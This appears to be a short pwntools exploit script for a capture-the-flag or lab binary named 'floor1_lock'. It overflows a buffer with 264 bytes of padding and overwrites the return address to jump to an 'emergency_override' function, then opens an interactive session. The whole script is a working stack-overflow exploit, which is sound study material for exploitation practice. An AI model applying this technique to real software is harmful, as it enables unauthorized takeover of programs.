from pwn import *

elf = context.binary = ELF('./floor1_lock')

offset = 264

payload = offset * b'A' + p64(elf.sym.emergency_override)

p = process()

p.sendline(payload)

p.interactive()
